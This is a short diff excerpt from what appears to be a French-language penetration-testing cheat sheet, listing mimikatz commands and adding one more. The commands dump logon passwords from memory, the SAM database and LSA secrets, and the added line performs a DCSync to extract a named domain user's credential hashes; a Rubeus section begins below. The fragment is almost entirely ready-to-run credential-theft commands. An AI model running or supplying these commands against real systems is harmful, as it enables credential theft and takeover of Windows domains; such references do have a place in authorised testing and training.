@@ -294,6 +294,8 @@ Protocoles à tester : SMB, WINRM, RDP, MSSQL, FTP, LDAP, SSH
     ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
     ./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
     ./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
+    ./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::dcsync /user:DOMAINE\Tim"
+    
    
 **Rubeus**
 
